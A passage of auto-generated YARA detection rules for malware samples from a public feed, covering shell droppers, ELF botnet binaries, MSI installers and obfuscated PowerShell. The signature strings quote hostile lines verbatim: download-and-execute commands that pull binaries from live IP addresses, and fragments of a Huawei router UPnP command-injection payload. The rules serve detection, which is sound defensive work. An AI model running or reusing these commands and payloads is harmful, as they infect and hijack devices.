      $s4 = "cp /bin/busybox busybox; rm -rf o; curl http://87.121.112.16/mips    -o o; chmod 777 o; ./o selfrep.curl" fullword ascii
      $s5 = "cp /bin/busybox busybox; rm -rf o; curl http://87.121.112.16/spc     -o o; chmod 777 o; ./o selfrep.curl" fullword ascii
      $s6 = "cp /bin/busybox busybox; rm -rf o; curl http://87.121.112.16/arm5    -o o; chmod 777 o; ./o selfrep.curl" fullword ascii
      $s7 = "cp /bin/busybox busybox; rm -rf o; curl http://87.121.112.16/arc     -o o; chmod 777 o; ./o selfrep.curl" fullword ascii
      $s8 = "cp /bin/busybox busybox; rm -rf o; curl http://87.121.112.16/ppc     -o o; chmod 777 o; ./o selfrep.curl" fullword ascii
      $s9 = "cp /bin/busybox busybox; rm -rf o; curl http://87.121.112.16/m68k    -o o; chmod 777 o; ./o selfrep.curl" fullword ascii
      $s10 = "cp /bin/busybox busybox; rm -rf o; curl http://87.121.112.16/arm     -o o; chmod 777 o; ./o selfrep.curl" fullword ascii
      $s11 = "cp /bin/busybox busybox; rm -rf o; curl http://87.121.112.16/arm7    -o o; chmod 777 o; ./o selfrep.curl" fullword ascii
      $s12 = "cp /bin/busybox busybox; rm -rf o; curl http://87.121.112.16/arm6    -o o; chmod 777 o; ./o selfrep.curl" fullword ascii
      $s13 = "#!/bin/sh" fullword ascii /* Goodware String - occured 3 times */
   condition:
      uint16(0) == 0x2123 and filesize < 3KB and
      8 of them
}

rule cbc4a127adfe168e527ea8de6394ed976991694a28d805d887c5a684b22d2c6a {
   meta:
      description = "evidences - file cbc4a127adfe168e527ea8de6394ed976991694a28d805d887c5a684b22d2c6a.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-05"
      hash1 = "cbc4a127adfe168e527ea8de6394ed976991694a28d805d887c5a684b22d2c6a"
   strings:
      $s1 = "http_server=\"103.149.87.69\"" fullword ascii
      $s2 = "        wget http://$http_server/le/$a -O -> upnp" fullword ascii
      $s3 = "cd /var/tmp" fullword ascii
      $s4 = "cd /tmp/tmpfs" fullword ascii
      $s5 = "cd /tmp" fullword ascii
      $s6 = "cd /var/run" fullword ascii
      $s7 = "cd /dev/shm" fullword ascii
      $s8 = "rm -rf upnp" fullword ascii
      $s9 = "#!/bin/sh" fullword ascii /* Goodware String - occured 3 times */
      $s10 = "n=\"078d9c 1d30df 2e6a56 71b160 9763ac dbf74d 117333 2b27f5 331081 860475 a945bf\"" fullword ascii
      $s11 = "for a in $n" fullword ascii
   condition:
      uint16(0) == 0x2123 and filesize < 1KB and
      8 of them
}

rule f7be400da91b8734af010b5e7d3ec7b3fbcb03a9aca72b56d084acde7a17e240 {
   meta:
      description = "evidences - file f7be400da91b8734af010b5e7d3ec7b3fbcb03a9aca72b56d084acde7a17e240.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-05"
      hash1 = "f7be400da91b8734af010b5e7d3ec7b3fbcb03a9aca72b56d084acde7a17e240"
   strings:
      $s1 = "http_server=\"103.149.87.69\"" fullword ascii
      $s2 = "        wget http://$http_server/le/$a -O -> upnp" fullword ascii
      $s3 = "cd /var/tmp" fullword ascii
      $s4 = "cd /tmp/tmpfs" fullword ascii
      $s5 = "cd /tmp" fullword ascii
      $s6 = "cd /var/run" fullword ascii
      $s7 = "cd /dev/shm" fullword ascii
      $s8 = "rm -rf upnp" fullword ascii
      $s9 = "#!/bin/sh" fullword ascii /* Goodware String - occured 3 times */
      $s10 = "        ./upnp dvr.t.new" fullword ascii
      $s11 = "n=\"078d9c 1d30df 2e6a56 71b160 9763ac dbf74d 117333 2b27f5 331081 860475 a945bf\"" fullword ascii
      $s12 = "for a in $n" fullword ascii
   condition:
      uint16(0) == 0x2123 and filesize < 1KB and
      8 of them
}

rule sig_13b747831b2c2eea59e2d8f43af3ec8b52f6f3b2294202552fb2f86dce9f8878 {
   meta:
      description = "evidences - file 13b747831b2c2eea59e2d8f43af3ec8b52f6f3b2294202552fb2f86dce9f8878.msi"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-05"
      hash1 = "13b747831b2c2eea59e2d8f43af3ec8b52f6f3b2294202552fb2f86dce9f8878"
   strings:
      $x1 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $s2 = "yOUj.KsM" fullword ascii
      $s3 = "roductCode{C244B00C-3AE7-4A53-B5BB-A2E3DCB6586A}ProductLanguage1033ProductNameProductVersion1.2.4.9UpgradeCodel not be installed" ascii
      $s4 = "cThmB%T%E " fullword ascii
      $s5 = "TMPc!Vrz" fullword ascii
      $s6 = "8nK:\"v" fullword ascii
      $s7 = "u(Kx>O:\"U>" fullword ascii
      $s8 = "LLJUPPQ" fullword ascii
      $s9 = "KW8%s-" fullword ascii
      $s10 = "DLOG{w" fullword ascii
      $s11 = "%IRC~C" fullword ascii
      $s12 = "H{YSPyu}" fullword ascii
      $s13 = "I`Y\\+ " fullword ascii
      $s14 = "1Js -?" fullword ascii
      $s15 = "qVI* 5P" fullword ascii
      $s16 = "\\o~%D<h" fullword ascii
      $s17 = "7>hJ<* iUuC6" fullword ascii
      $s18 = "psqtrw" fullword ascii
      $s19 = "GeZvGvh5" fullword ascii
      $s20 = "YbyItp7" fullword ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 27000KB and
      1 of ($x*) and 4 of them
}

rule e8ed66a74aad1736a15b12e4a080bfe6bf3ad94f9a3051465d0482fe365b3ff3 {
   meta:
      description = "evidences - file e8ed66a74aad1736a15b12e4a080bfe6bf3ad94f9a3051465d0482fe365b3ff3.msi"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-05"
      hash1 = "e8ed66a74aad1736a15b12e4a080bfe6bf3ad94f9a3051465d0482fe365b3ff3"
   strings:
      $x1 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $s2 = "yOUj.KsM" fullword ascii
      $s3 = "roductCode{C244B00C-3AE7-4A53-B5BB-A2E3DCB6586A}ProductLanguage1033ProductNameProductVersion1.2.4.9UpgradeCodel not be installed" ascii
      $s4 = "cThmB%T%E " fullword ascii
      $s5 = "srtgfdh" fullword ascii
      $s6 = "TMPc!Vrz" fullword ascii
      $s7 = "8nK:\"v" fullword ascii
      $s8 = "u(Kx>O:\"U>" fullword ascii
      $s9 = "LLJUPPQ" fullword ascii
      $s10 = "KW8%s-" fullword ascii
      $s11 = "DLOG{w" fullword ascii
      $s12 = "%IRC~C" fullword ascii
      $s13 = "H{YSPyu}" fullword ascii
      $s14 = "I`Y\\+ " fullword ascii
      $s15 = "1Js -?" fullword ascii
      $s16 = "qVI* 5P" fullword ascii
      $s17 = "\\o~%D<h" fullword ascii
      $s18 = "7>hJ<* iUuC6" fullword ascii
      $s19 = "psqtrw" fullword ascii
      $s20 = "GeZvGvh5" fullword ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 27000KB and
      1 of ($x*) and 4 of them
}

rule sig_14cfd9dcd97a6ce97aca50f19d8d5277c2db69111be2bead78ad9e63384f640b {
   meta:
      description = "evidences - file 14cfd9dcd97a6ce97aca50f19d8d5277c2db69111be2bead78ad9e63384f640b.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-05"
      hash1 = "14cfd9dcd97a6ce97aca50f19d8d5277c2db69111be2bead78ad9e63384f640b"
   strings:
      $s1 = "(wget http://185.157.247.12/vv/armv5l -O- || busybox wget http://185.157.247.12/vv/armv5l -O-) > .f; chmod 777 .f; ./.f rooster;" ascii
      $s2 = "(wget http://185.157.247.12/vv/mipsel -O- || busybox wget http://185.157.247.12/vv/mipsel -O-) > .f; chmod 777 .f; ./.f rooster;" ascii
      $s3 = "(wget http://185.157.247.12/vv/armv5l -O- || busybox wget http://185.157.247.12/vv/armv5l -O-) > .f; chmod 777 .f; ./.f rooster;" ascii
      $s4 = "(wget http://185.157.247.12/vv/armv4l -O- || busybox wget http://185.157.247.12/vv/armv4l -O-) > .f; chmod 777 .f; ./.f rooster;" ascii
      $s5 = "(wget http://185.157.247.12/vv/arc -O- || busybox wget http://185.157.247.12/vv/arc -O-) > .f; chmod 777 .f; ./.f rooster; > .f;" ascii
      $s6 = "(wget http://185.157.247.12/vv/i686 -O- || busybox wget http://185.157.247.12/vv/i686 -O-) > .f; chmod 777 .f; ./.f ssh; > .f; #" ascii
      $s7 = "(wget http://185.157.247.12/vv/riscv32 -O- || busybox wget http://185.157.247.12/vv/riscv32 -O-) > .f; chmod 777 .f; ./.f rooste" ascii
      $s8 = "(wget http://185.157.247.12/vv/sh4 -O- || busybox wget http://185.157.247.12/vv/sh4 -O-) > .f; chmod 777 .f; ./.f rooster; > .f;" ascii
      $s9 = "(wget http://185.157.247.12/vv/armv4eb -O- || busybox wget http://185.157.247.12/vv/armv4eb -O-) > .f; chmod 777 .f; ./.f rooste" ascii
      $s10 = "(wget http://185.157.247.12/vv/sparc -O- || busybox wget http://185.157.247.12/vv/sparc -O-) > .f; chmod 777 .f; ./.f rooster; >" ascii
      $s11 = "(wget http://185.157.247.12/vv/powerpc -O- || busybox wget http://185.157.247.12/vv/powerpc -O-) > .f; chmod 777 .f; ./.f rooste" ascii
      $s12 = "(wget http://185.157.247.12/vv/arc -O- || busybox wget http://185.157.247.12/vv/arc -O-) > .f; chmod 777 .f; ./.f rooster; > .f;" ascii
      $s13 = "(wget http://185.157.247.12/vv/superh-O- || busybox wget http://185.157.247.12/vv/superh -O-) > .f; chmod 777 .f; ./.f rooster; " ascii
      $s14 = "(wget http://185.157.247.12/vv/mips -O- || busybox wget http://185.157.247.12/vv/mips -O-) > .f; chmod 777 .f; ./.f rooster; > ." ascii
      $s15 = "(wget http://185.157.247.12/vv/sparc -O- || busybox wget http://185.157.247.12/vv/sparc -O-) > .f; chmod 777 .f; ./.f rooster; >" ascii
      $s16 = "(wget http://185.157.247.12/vv/mipsel -O- || busybox wget http://185.157.247.12/vv/mipsel -O-) > .f; chmod 777 .f; ./.f rooster;" ascii
      $s17 = "(wget http://185.157.247.12/vv/sh4 -O- || busybox wget http://185.157.247.12/vv/sh4 -O-) > .f; chmod 777 .f; ./.f rooster; > .f;" ascii
      $s18 = "(wget http://185.157.247.12/vv/riscv32 -O- || busybox wget http://185.157.247.12/vv/riscv32 -O-) > .f; chmod 777 .f; ./.f rooste" ascii
      $s19 = "(wget http://185.157.247.12/vv/armv7l -O- || busybox wget http://185.157.247.12/vv/armv7l -O-) > .f; chmod 777 .f; ./.f rooster;" ascii
      $s20 = "(wget http://185.157.247.12/vv/armv4eb -O- || busybox wget http://185.157.247.12/vv/armv4eb -O-) > .f; chmod 777 .f; ./.f rooste" ascii
   condition:
      uint16(0) == 0x2f3e and filesize < 10KB and
      8 of them
}

rule sig_15cfe8889cf12035c69b8b8c9d20d8a8af7dfcd6d791dbc9f40189d740bdbfe4 {
   meta:
      description = "evidences - file 15cfe8889cf12035c69b8b8c9d20d8a8af7dfcd6d791dbc9f40189d740bdbfe4.msi"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-05"
      hash1 = "15cfe8889cf12035c69b8b8c9d20d8a8af7dfcd6d791dbc9f40189d740bdbfe4"
   strings:
      $x1 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $s2 = "roductCode{A40907DC-3DD2-48E9-9D3B-EA2001DE3431}ProductLanguage1033ProductNameProductVersion1.2.4.9UpgradeCodel not be installed" ascii
      $s3 = "dfsfhrt" fullword ascii
      $s4 = "?YJ:\"\\" fullword ascii
      $s5 = "bXL.kqc" fullword ascii
      $s6 = "b{9X:\"" fullword ascii
      $s7 = "t:\"+X(" fullword ascii
      $s8 = "Nvatujb" fullword ascii
      $s9 = "XHqExz9" fullword ascii
      $s10 = "Ns+?+ )#b" fullword ascii
      $s11 = "P%FU%T" fullword ascii
      $s12 = "W6{%y%" fullword ascii
      $s13 = "-Fh+ B" fullword ascii
      $s14 = "nmhofb" fullword ascii
      $s15 = "CvE0Yn" fullword ascii
      $s16 = " /Dp\"$OY#f" fullword ascii
      $s17 = "z- U<$" fullword ascii
      $s18 = "apkTMY5" fullword ascii
      $s19 = "x:a- w" fullword ascii
      $s20 = "\\prrpx;5" fullword ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 27000KB and
      1 of ($x*) and 4 of them
}

rule sig_173427fdf1509c5eea754ca8909ce3d6a83b4c57247ffc2660e07f28863a81b9 {
   meta:
      description = "evidences - file 173427fdf1509c5eea754ca8909ce3d6a83b4c57247ffc2660e07f28863a81b9.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-05"
      hash1 = "173427fdf1509c5eea754ca8909ce3d6a83b4c57247ffc2660e07f28863a81b9"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii
      $s2 = "in/busybox wget -g %d.%d.%d.%d -l /tmp/.vs -r /1; /bin/busybox chmod 777 /tmp/.vs; /tmp/.vs huawei.selfrep)</NewStatusURL><NewDo" ascii
      $s3 = "GET /dlr.%s HTTP/1.1" fullword ascii
      $s4 = "User-Agent: wget (dlr)" fullword ascii
      $s5 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows" fullword ascii
      $s6 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1" fullword ascii
      $s7 = "g/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(rm -rf /tmp/*;" ascii
      $s8 = "Host: 127.0.0.1" fullword ascii
      $s9 = "HOST: 255.255.255.255:1900" fullword ascii
      $s10 = "Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/" ascii
      $s11 = "service:service-agent" fullword ascii
      $s12 = "Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/" ascii
      $s13 = "/bin/busybox echo -ne " fullword ascii
      $s14 = "wnloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii
      $s15 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii
      $s16 = "usage: busybox" fullword ascii
      $s17 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr" fullword ascii
      $s18 = "eviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a25" ascii
      $s19 = "assword" fullword ascii
      $s20 = "sername" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 700KB and
      1 of ($x*) and 4 of them
}

rule sig_17739a4a7b0f5269ec1bf78b60a9b6553ffe61a13d07f11a8ff16e027ad23b5a {
   meta:
      description = "evidences - file 17739a4a7b0f5269ec1bf78b60a9b6553ffe61a13d07f11a8ff16e027ad23b5a.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-05"
      hash1 = "17739a4a7b0f5269ec1bf78b60a9b6553ffe61a13d07f11a8ff16e027ad23b5a"
   strings:
      $s1 = "No child process" fullword ascii
      $s2 = " [killer] killed - %s - %s" fullword ascii
      $s3 = "No file descriptors available" fullword ascii
      $s4 = "Remote I/O error" fullword ascii
      $s5 = "No error information" fullword ascii
      $s6 = "rustc version 1.85.0-nightly (9c707a8b7 2024-12-07)" fullword ascii
      $s7 = "Connection reset by network" fullword ascii
      $s8 = "Address in use" fullword ascii
      $s9 = "CStr::from_bytes_with_nul failed/" fullword ascii
      $s10 = "Connection aborted" fullword ascii /* Goodware String - occured 20 times */
      $s11 = "Protocol error" fullword ascii /* Goodware String - occured 26 times */
      $s12 = "Network unreachable" fullword ascii /* Goodware String - occured 53 times */
      $s13 = "Protocol not supported" fullword ascii /* Goodware String - occured 73 times */
      $s14 = "Connection refused" fullword ascii /* Goodware String - occured 127 times */
      $s15 = "Broken pipe" fullword ascii /* Goodware String - occured 742 times */
      $s16 = "Permission denied" fullword ascii /* Goodware String - occured 823 times */
      $s17 = "Value too large for data type" fullword ascii
      $s18 = "Stale file handle" fullword ascii
      $s19 = "Device timeout" fullword ascii
      $s20 = "Wrong medium type" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      8 of them
}

rule sig_67913b98eae4f0a2b269025cd6ef950d57d2447f332abf86590cc3f1bef51a92 {
   meta:
      description = "evidences - file 67913b98eae4f0a2b269025cd6ef950d57d2447f332abf86590cc3f1bef51a92.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-05"
      hash1 = "67913b98eae4f0a2b269025cd6ef950d57d2447f332abf86590cc3f1bef51a92"
   strings:
      $s1 = "relogin.htm" fullword ascii
      $s2 = "User-Agent: curl/7.88.1" fullword ascii
      $s3 = "authkey" fullword ascii
      $s4 = "hostport=" fullword ascii
      $s5 = "Hash.Cookie" fullword ascii
      $s6 = "{ \"Name\" : \"OPSystemUpgrade\", \"OPSystemUpgrade\" : { \"Action\" : \"Start\", \"Type\" : \"System\" }, \"SessionID\" : \"0x0" ascii
      $s7 = "o?head-?ebs" fullword ascii
      $s8 = "t{|}f&~gq{&fdt{|}f9&d&oggodm&kget{|}f:&d&oggodm&kget{|}f;&d&oggodm&kget{|}f<&d&oggodm&kget{|}f&~gax{|}f|&kget{|}f&{axfm|&fm|" fullword ascii
      $s9 = "/sys/devices/system/cpu" fullword ascii
      $s10 = "pluginVersionTip" fullword ascii
      $s11 = "mini_httpd" fullword ascii
      $s12 = "cgi-bin/main-cgi" fullword ascii
      $s13 = "?ages/?ogin.htm" fullword ascii
      $s14 = "{ \"Ret\" : 100, \"SessionID\" : \"0x0\" }" fullword ascii
      $s15 = "\"OPSystemUpgrade\", \"Ret\" : 100" fullword ascii
      $s16 = "HTTPD_gw" fullword ascii
      $s17 = "?ogin.rsp" fullword ascii
      $s18 = "doc/script" fullword ascii
      $s19 = "TKXGYKI" fullword ascii
      $s20 = "111.111.111.111" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      8 of them
}

rule sig_97ab0caaed85cd2ec2f2ccc571043a668573f18d63f3e10b6867f2f7402e9591 {
   meta:
      description = "evidences - file 97ab0caaed85cd2ec2f2ccc571043a668573f18d63f3e10b6867f2f7402e9591.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-05"
      hash1 = "97ab0caaed85cd2ec2f2ccc571043a668573f18d63f3e10b6867f2f7402e9591"
   strings:
      $s1 = "No child process" fullword ascii
      $s2 = "[killer] killed - %s - %s" fullword ascii
      $s3 = "No file descriptors available" fullword ascii
      $s4 = "Remote I/O error" fullword ascii
      $s5 = "No error information" fullword ascii
      $s6 = "rustc version 1.85.0-nightly (9c707a8b7 2024-12-07)" fullword ascii
      $s7 = "Connection reset by network" fullword ascii
      $s8 = "Address in use" fullword ascii
      $s9 = "CStr::from_bytes_with_nul failed/" fullword ascii
      $s10 = "Key has been revoked" fullword ascii
      $s11 = "Key was rejected by service" fullword ascii
      $s12 = "Required key not available" fullword ascii
      $s13 = "Key has expired" fullword ascii
      $s14 = ".ARM.attributes" fullword ascii
      $s15 = "Connection aborted" fullword ascii /* Goodware String - occured 20 times */
      $s16 = "Protocol error" fullword ascii /* Goodware String - occured 26 times */
      $s17 = "Network unreachable" fullword ascii /* Goodware String - occured 53 times */
      $s18 = "Protocol not supported" fullword ascii /* Goodware String - occured 73 times */
      $s19 = "Connection refused" fullword ascii /* Goodware String - occured 127 times */
      $s20 = "Broken pipe" fullword ascii /* Goodware String - occured 742 times */
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      8 of them
}

rule d721c05478570f8c5e7910f5ca0ca9bebd344d35eedfc4989100b5f13bb1432a {
   meta:
      description = "evidences - file d721c05478570f8c5e7910f5ca0ca9bebd344d35eedfc4989100b5f13bb1432a.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-05"
      hash1 = "d721c05478570f8c5e7910f5ca0ca9bebd344d35eedfc4989100b5f13bb1432a"
   strings:
      $s1 = "relogin.htm" fullword ascii
      $s2 = "User-Agent: curl/7.88.1" fullword ascii
      $s3 = "authkey" fullword ascii
      $s4 = "hostport=" fullword ascii
      $s5 = "Hash.Cookie" fullword ascii
      $s6 = "{ \"Name\" : \"OPSystemUpgrade\", \"OPSystemUpgrade\" : { \"Action\" : \"Start\", \"Type\" : \"System\" }, \"SessionID\" : \"0x0" ascii
      $s7 = "o?head-?ebs" fullword ascii
      $s8 = "t{|}f&~gq{&fdt{|}f9&d&oggodm&kget{|}f:&d&oggodm&kget{|}f;&d&oggodm&kget{|}f<&d&oggodm&kget{|}f&~gax{|}f|&kget{|}f&{axfm|&fm|" fullword ascii
      $s9 = "pluginVersionTip" fullword ascii
      $s10 = "mini_httpd" fullword ascii
      $s11 = "cgi-bin/main-cgi" fullword ascii
      $s12 = "?ages/?ogin.htm" fullword ascii
      $s13 = "{ \"Ret\" : 100, \"SessionID\" : \"0x0\" }" fullword ascii
      $s14 = "\"OPSystemUpgrade\", \"Ret\" : 100" fullword ascii
      $s15 = "HTTPD_gw" fullword ascii
      $s16 = "?ogin.rsp" fullword ascii
      $s17 = "doc/script" fullword ascii
      $s18 = "TKXGYKI" fullword ascii
      $s19 = "111.111.111.111" fullword ascii
      $s20 = "\\XBRnUTG1" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      8 of them
}

rule sig_716804dc52929e19b87c3d81e69250c79abaec9a8741ee5ebb80a6e2dcbccdbb {
   meta:
      description = "evidences - file 716804dc52929e19b87c3d81e69250c79abaec9a8741ee5ebb80a6e2dcbccdbb.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-05"
      hash1 = "716804dc52929e19b87c3d81e69250c79abaec9a8741ee5ebb80a6e2dcbccdbb"
   strings:
      $s1 = "relogin.htm" fullword ascii
      $s2 = "User-Agent: curl/7.88.1" fullword ascii
      $s3 = "authkey" fullword ascii
      $s4 = "hostport=" fullword ascii
      $s5 = "Hash.Cookie" fullword ascii
      $s6 = "{ \"Name\" : \"OPSystemUpgrade\", \"OPSystemUpgrade\" : { \"Action\" : \"Start\", \"Type\" : \"System\" }, \"SessionID\" : \"0x0" ascii
      $s7 = "o?head-?ebs" fullword ascii
      $s8 = "t{|}f&~gq{&fdt{|}f9&d&oggodm&kget{|}f:&d&oggodm&kget{|}f;&d&oggodm&kget{|}f<&d&oggodm&kget{|}f&~gax{|}f|&kget{|}f&{axfm|&fm|" fullword ascii
      $s9 = "pluginVersionTip" fullword ascii
      $s10 = "mini_httpd" fullword ascii
      $s11 = "cgi-bin/main-cgi" fullword ascii
      $s12 = "?ages/?ogin.htm" fullword ascii
      $s13 = "{ \"Ret\" : 100, \"SessionID\" : \"0x0\" }" fullword ascii
      $s14 = "\"OPSystemUpgrade\", \"Ret\" : 100" fullword ascii
      $s15 = "HTTPD_gw" fullword ascii
      $s16 = "?ogin.rsp" fullword ascii
      $s17 = "doc/script" fullword ascii
      $s18 = "TKXGYKI" fullword ascii
      $s19 = "111.111.111.111" fullword ascii
      $s20 = "\\XBRnUTG1" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      8 of them
}

rule sig_1b0de1c0fbe215ee45c39210abbfb6b24cc9fd1c23f126d7f2fa3ec10c2e7d0d {
   meta:
      description = "evidences - file 1b0de1c0fbe215ee45c39210abbfb6b24cc9fd1c23f126d7f2fa3ec10c2e7d0d.msi"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-05"
      hash1 = "1b0de1c0fbe215ee45c39210abbfb6b24cc9fd1c23f126d7f2fa3ec10c2e7d0d"
   strings:
      $x1 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $s2 = "roductCode{902DEE9F-A3DC-4D62-B01C-3B932DB5BDF6}ProductLanguage1033ProductNameProductVersion1.2.4.9UpgradeCodel not be installed" ascii
      $s3 = "sdfertgtuj" fullword ascii
      $s4 = "q:\\%$d" fullword ascii
      $s5 = "e6hU:\\" fullword ascii
      $s6 = "G8m.AvP" fullword ascii
      $s7 = "V[SgeT" fullword ascii
      $s8 = "#^J- 6" fullword ascii
      $s9 = "\\QGXDT?" fullword ascii
      $s10 = "Hqe+ _[" fullword ascii
      $s11 = "YEleJo1" fullword ascii
      $s12 = " -A\\P8=" fullword ascii
      $s13 = "~J- bD" fullword ascii
      $s14 = "F- J=\\" fullword ascii
      $s15 = "ByAah\\l" fullword ascii
      $s16 = "BOvFm0!" fullword ascii
      $s17 = "Qjhj};h" fullword ascii
      $s18 = "<<bqot>m84o" fullword ascii
      $s19 = "pwse.y}" fullword ascii
      $s20 = "OBym&9yyzI" fullword ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 24000KB and
      1 of ($x*) and 4 of them
}

rule sig_64a364c581318226bdeee69fdd6097a2b17599e9eaccea487e01c878424ab7fc {
   meta:
      description = "evidences - file 64a364c581318226bdeee69fdd6097a2b17599e9eaccea487e01c878424ab7fc.ps1"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-05"
      hash1 = "64a364c581318226bdeee69fdd6097a2b17599e9eaccea487e01c878424ab7fc"
   strings:
      $s1 = "YPbKrPPtFjBjPqJ8ASr6vvLdqFN2YfhOrzw/PuhFHiVduJD7pECCQUt6JzY+fHspYgzqGChoPgz+qyzoNxCRqiVDho6dmOUpbXbJvxBQPV6CDy9ESN/5zzqjgPf4hOIY" ascii
      $s2 = "[System.Text.Encoding]::ascii.((-join (@((227342/3202),(587416/5816),(116232/1002),(253814/3058),(97324/839),(1371-1257),(571830" ascii
      $s3 = "sNU8Ee+4yBf/STqbWp0Chrgq69AscRUM18RykWMmo/FB6u0MoWNNkbGXfUNJVwrtpJQs4LvDsh1t/P4AssMGC+MdvctUY9emIJIRSCMV5elP4YoN2f61wiO33vg/a6/a" ascii
      $s4 = "22Zt01S/OKOxIWadcdLwMgP3DSiJFK09BVFYchvSFi3DaRcsRySdzEF5x0zkuOCFf9pxGz8r9HTr77Q/oEi0eMMiG3lBinbPAOd3E65U2XnaJ6amYETXOnWCwpZyDja+" ascii
      $s5 = "vibas8dzKzh6DkZyz8ZdOOH/JmYDLjsHuvI8LpuzSbsW39pkARFD2xP/+6x0X1mS6Ywjdr2PUAWRboxgLsHngwyv0fOIAk8Ri1DbhOGCnePMs+IBurUnnpywxhNLTXQQ" ascii
      $s6 = "5dpWJpYMM1kkhkWGduoc8WDTeMBWTXMbHoSb8RGnmG0YynnQKOJ5szEK9yEe7e8SICnungfmKO+02Gy+vT2q6RXqqHmmMSHMcMdq/rML8mADnMGaG5KvVQEOt8yrPWUC" ascii
      $s7 = "6nXaM2FsIQRwMBRjUDhpAia15dT5GTl0cj5H89XSR1a6WHJ0WDljOsaiJ5NwAipgHDpfso7LzkTbDyLlqXhxGnZ6dJT8lnz25jIfTmpvCs+IXzF+4jtXM0Y6AvLOeHmz" ascii
      $s8 = "ubstring(($_ * ([math]::Pow(2, 1 + 2))), ([math]::Pow(2, 1 + 2))) - 61)})).(([cHAR[]]@((655472/(79626000/8625)),(-7757+(17456-(1" ascii
      $s9 = "3+(3440+5688))))),(657580/(59510990/(70979150/(3680+3450)))),(906503/8801)) -join ''))(($_ * (2117-(7718-(-3329+8932)))), (-9385" ascii
      $s10 = "700000086000000880000008200000088\".Substring(($_ * ([math]::Pow(2, 2 + 1))), ([math]::Pow(2, 2 + 1))) - 32)});$oninatenonreisal" ascii
      $s11 = "$dknchztum=$executioncontext;$edisataltiononbeorerisanatan = -join (0..54 | ForEach-Object {[char]([int]\"0000008500000084000000" ascii
      $s12 = "000000001310000000000000115\".Substring(($_ * ([math]::Pow(2, 2 + 2))), ([math]::Pow(2, 2 + 2))) - 14)}))($null, $true)" fullword ascii
      $s13 = "11/6lkSIKb+RWGwe8PkbEp+mSTVO0sZhddVbVpXlLkkBaodp64lFaASK57AQBHWqcc1NFc91GpSkcZIlN9lB9omFyIgX4VL8xI+Yzm1VUXaia0pFYEexLhyb0fHRVKoD" ascii
      $s14 = "2+m7qi8t9hZqptvzRCMaITwsSqBplCDvBHsXDDSzWkpBegOXWV/kfNXp0PdKQMkaE54+ZcjlcpovJMhfZyF4tVuQkdHwwMSsz2rFRGbVlOjG6KV8kIYgx1O4qG/55IF9" ascii
      $s15 = "$dknchztum=$executioncontext;$edisataltiononbeorerisanatan = -join (0..54 | ForEach-Object {[char]([int]\"0000008500000084000000" ascii
      $s16 = "oLPQrfkj4CXu9MvoUzdSC3RZuwDibF/G/e6MmuG5euZLbdmIQp90LMVGRE5GnCWJIKzAAzLufKytT27Xmj2vqbCH8zkIyIMfDWWdkXEOT+ts7FnpoqM1VmJM6lM1/YVa" ascii
